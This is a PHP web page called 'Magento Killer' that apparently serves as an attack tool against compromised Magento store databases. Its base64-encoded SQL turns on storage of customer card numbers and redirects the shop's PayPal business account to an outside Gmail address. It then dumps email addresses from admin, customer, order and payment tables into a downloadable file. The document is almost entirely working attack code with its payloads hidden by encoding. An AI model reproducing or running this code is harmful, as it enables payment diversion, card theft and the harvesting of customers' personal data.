<!DOCTYPE html>
<html>
<head>
<title>Magento Killer | SHOR7CUT | Bug7sec Team</title>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.0/jquery.min.js"></script>
<style type="text/css">
    body{
                color: #3EF403;
                background-color: black;
        }
    input {
    border: dashed 1px;
    border-color: #333;
    BACKGROUND-COLOR: Black;
    font: 8pt Verdana;
    color: #0CFF37;
        }

    select {
    border: dashed 1px;
    border-color: #333;
    BACKGROUND-COLOR: Black;
    font: 8pt Verdana;
    color: #0CFF37;
}
    textarea {
    margin: 0;
    color: #fff;
    background-color: #555;
    border: 1px solid #df5;
    font: 9pt Monospace,'Courier New'; }
        </style>
   
</head>
<body>
<pre style="text-align: center">
-[ Magento Killer |  Bug7sec Team ]-
</pre>
<Center>
<form action="" method="post">
<input type="text" value="localhost" name="host" placeholder="Server Database">
<input type="text" value="" name="username" placeholder="username">
<input type="text" value="" name="password" placeholder="password">
<input type="text" value="" name="database" placeholder="database">
<input type="submit" name="submit" value="Scan Now!"/> 
</form>
</Center>
<?php
        error_reporting(0);
        if( $_POST['submit'] ){
            mysql_connect($_POST['host'], $_POST['username'],$_POST['password']);
            mysql_select_db($_POST['database']);

            /** CONFIG KILLER **/
            $ConfKiller = array(
                'Update DB (Savecc)' => base64_decode('VVBEQVRFIGBjb3JlX2NvbmZpZ19kYXRhYCBTRVQNCmBzY29wZWAgPSAnZGVmYXVsdCcsDQpgc2NvcGVfaWRgID0gJzAnLA0KYHBhdGhgID0gJ3BheW1lbnQvY2NzYXZlL2FjdGl2ZScsDQpgdmFsdWVgID0gJzEnDQpXSEVSRSBgcGF0aGAgPSAncGF5bWVudC9jY3NhdmUvYWN0aXZlJzs='), 
                'Update PP (MailPP)' => base64_decode('VVBEQVRFIGBjb3JlX2NvbmZpZ19kYXRhYCBTRVQKYHNjb3BlYCA9ICdkZWZhdWx0JywKYHNjb3BlX2lkYCA9ICcwJywKYHBhdGhgID0gJ3BheXBhbC9nZW5lcmFsL2J1c2luZXNzX2FjY291bnQnLApgdmFsdWVgID0gJ3RhbXB1bmdhbm1hZ2VudG9AZ21haWwuY29tJwpXSEVSRSBgcGF0aGAgPSAncGF5cGFsL2dlbmVyYWwvYnVzaW5lc3NfYWNjb3VudCc7')
            );
            foreach ($ConfKiller as $key => $shc_queryX) {
               $hasil = mysql_query($shc_queryX);
               if($hasil){
                    echo "[SHC KILLER] ".$key." -> Success<br>";
               }
            }

            $query = array(
                'admin_user'                        => 'SELECT * FROM admin_user' ,
                'aw_blog_comment'                   => 'SELECT * FROM aw_blog_comment' ,
                'core_email_queue_recipients'       => 'SELECT * FROM core_email_queue_recipients' ,
                'customer_entity'                   => 'SELECT * FROM customer_entity' ,
                'newsletter_subscriber'             => 'SELECT * FROM newsletter_subscriber' ,
                'newsletter_template'               => 'SELECT * FROM newsletter_template' ,
                'sales_flat_order_address'          => 'SELECT * FROM sales_flat_order_address' ,
                'sales_flat_order_payment'          => 'SELECT * FROM sales_flat_order_payment' ,
                'sales_flat_quote'                  => 'SELECT * FROM sales_flat_quote' ,
                'customer_entity_varchar'           => 'SELECT * FROM customer_entity_varchar' ,
                'customer_address_entity_varchar'   => 'SELECT * FROM customer_address_entity_varchar' ,
                'product_alert_stock'               => 'SELECT * FROM product_alert_stock' ,
                'pws_productqa'                     => 'SELECT * FROM pws_productqa' ,
                'sales_flat_order'                  => 'SELECT * FROM sales_flat_order' ,
                'sales_flat_quote_address'          => 'SELECT * FROM sales_flat_quote_address' ,
                'smtppro_email_log'                 => 'SELECT * FROM smtppro_email_log' ,
                'webforms_results_values'           => 'SELECT * FROM webforms_results_values' ,
                'sales_recurring_profile'           => 'SELECT * FROM sales_recurring_profile'
            );
            $shcolom = array(
                'admin_user'                        => 'email' ,
                'sales_flat_order_payment'          => 'additional_information' ,
                'sales_flat_quote_address'          => 'email' ,
                'smtppro_email_log'                 => 'email_to' ,
                'webforms_results_values'           => 'value' ,
                'aw_blog_comment'                   => 'email' ,
                'customer_entity_varchar'           => 'email' ,
                'product_alert_stock'               => 'email' ,
                'pws_productqa'                     => 'email' ,
                'sales_flat_order_address'          => 'email' ,
                'customer_entity'                   => 'email' ,
                'sales_flat_order'                  => 'customer_email' ,
                'customer_address_entity_varchar'   => 'value' ,
                'core_email_queue_recipients'       => 'recipient_email' ,
                'newsletter_subscriber'             => 'subscriber_email' ,
                'newsletter_template'               => 'template_sender_email' ,
                'sales_flat_quote'                  => 'customer_email' ,
                'sales_recurring_profile'           => 'SELECT * FROM admin_user'
            );
            $namefile = md5(time())."-shcMail.txt";
            foreach ($query as $shc_key => $shc_query) {
                $hasil = mysql_query($shc_query);
                    while ( $kolom_db = mysql_fetch_assoc($hasil) ) {
                        $mail[] = $kolom_db[$shcolom[$shc_key]];
                        $myfile = fopen($namefile, "a+") or die("Unable to open file!");
                        fwrite($myfile, $kolom_db[$shcolom[$shc_key]]."\r\n");
                        fclose($myfile);
                    }
            }
            if(file_exists($namefile)){
                echo '[SHC KILLER] Email : <a href="'.$namefile.'" target="_blank">'.$namefile.'</a><br>';
            }else{
                echo '[SHC KILLER] Email : - gak ada -<br>';
            }
        }
?>
</body>
</html>
